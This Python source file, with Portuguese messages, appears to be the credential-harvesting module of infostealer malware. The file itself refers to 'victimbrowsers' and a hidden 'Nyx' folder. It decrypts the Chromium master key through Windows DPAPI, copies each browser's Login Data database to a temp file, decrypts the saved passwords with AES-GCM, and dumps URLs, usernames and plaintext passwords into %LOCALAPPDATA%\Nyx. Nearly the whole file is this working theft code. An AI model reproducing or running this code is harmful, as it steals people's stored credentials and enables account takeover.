import os
import shutil
import sqlite3
import base64
import json
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from victimbrowsers import navegadores_instalados  


class PasswordExtractor:
    def __init__(self, browser_name: str):
        self.browser_name = browser_name
        self.browser_path = self.get_browser_path()

    def get_browser_path(self) -> str:
        paths = {
            "chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
            "brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
            "opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
            "edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
            "firefox": os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
        }
        return paths.get(self.browser_name.lower(), "")

    def get_encryption_key(self) -> bytes:
        try:
            if self.browser_name == "firefox":
                return None

            local_state_path = os.path.join(self.browser_path, "Local State")

            with open(local_state_path, 'r', encoding='utf-8') as file:
                local_state_data = json.load(file)

            encrypted_key = local_state_data["os_crypt"]["encrypted_key"]

            encrypted_key = base64.b64decode(encrypted_key)[5:]

            decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

            return decrypted_key
        except Exception as e:
            print(f"Erro ao obter a chave de criptografia: {e}")
            return None

    def decrypt_password(self, encrypted_password: bytes, key: bytes) -> str:
        try:
            iv = encrypted_password[3:15]
            encrypted_password = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
            return decrypted_password
        except Exception as e:
            print(f"Erro ao descriptografar: {e}")
            return ""

    def get_passwords_chromium(self) -> list[tuple[str, str, str]]:
        encryption_key = self.get_encryption_key()
        passwords = list()

        if encryption_key is None:
            print("Chave de criptografia não encontrada.")
            return passwords

        login_file_paths = list()

        for root, _, files in os.walk(self.browser_path):
            for file in files:
                if file.lower() == "login data":
                    filepath = os.path.join(root, file)
                    login_file_paths.append(filepath)

        for path in login_file_paths:
            while True:
                tempfile = os.path.join(
                    os.getenv("TEMP"), self.get_random_string(10) + ".tmp"
                )
                if not os.path.isfile(tempfile):
                    break

            try:
                shutil.copy(path, tempfile)
            except Exception as e:
                print(f"Erro ao copiar arquivo de login: {e}")
                continue

            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors="ignore")
            cursor = db.cursor()

            try:
                results = cursor.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"
                ).fetchall()

                for url, username, encrypted_password in results:
                    password = self.decrypt_password(encrypted_password, encryption_key)

                    if url and username and password:
                        passwords.append((url, username, password))

            except Exception as e:
                print(f"Erro ao consultar banco de dados: {e}")

            cursor.close()
            db.close()
            os.remove(tempfile)

        return passwords

    def get_passwords_firefox(self) -> list[tuple[str, str, str]]:
        # Implementar a lógica específica para Firefox, acessar o arquivo logins.json e descriptografar com key4.db
        print("Extração para Firefox ainda não implementada.")
        return []

    def get_random_string(self, length: int) -> str:
        return base64.urlsafe_b64encode(os.urandom(length)).decode()[:length]

    def save_passwords_to_file(self, passwords: list[tuple[str, str, str]], file_path: str) -> None:
        try:
            with open(file_path, 'w', encoding='utf-8') as file:
                for url, username, password in passwords:
                    file.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
            print(f"Senhas salvas em: {file_path}")
        except Exception as e:
            print(f"Erro ao salvar senhas em arquivo: {e}")

    def get_passwords(self) -> list[tuple[str, str, str]]:
        if self.browser_name in ["chrome", "brave", "opera", "edge"]:
            return self.get_passwords_chromium()
        elif self.browser_name == "firefox":
            return self.get_passwords_firefox()
        else:
            print(f"Navegador {self.browser_name} não suportado.")
            return []


if __name__ == "__main__":
    navegadores_suportados = navegadores_instalados()
    
    navegador_map = {
        'Chrome': 'chrome',
        'Firefox': 'firefox',
        'Edge': 'edge',
        'Opera': 'opera',
        'Brave': 'brave'
    }

    navegadores_convertidos = [navegador_map[n] for n in navegadores_suportados if n in navegador_map]

    for browser in navegadores_convertidos:
        extractor = PasswordExtractor(browser)
        passwords = extractor.get_passwords()

        if passwords:
            nyx_path = os.path.join(os.getenv("LOCALAPPDATA"), "Nyx")
            if not os.path.exists(nyx_path):
                os.makedirs(nyx_path)

            passwords_file_path = os.path.join(nyx_path, f"{browser}_passwords.txt")
            extractor.save_passwords_to_file(passwords, passwords_file_path)
        else:
            print(f"Nenhuma senha encontrada para {browser}.")
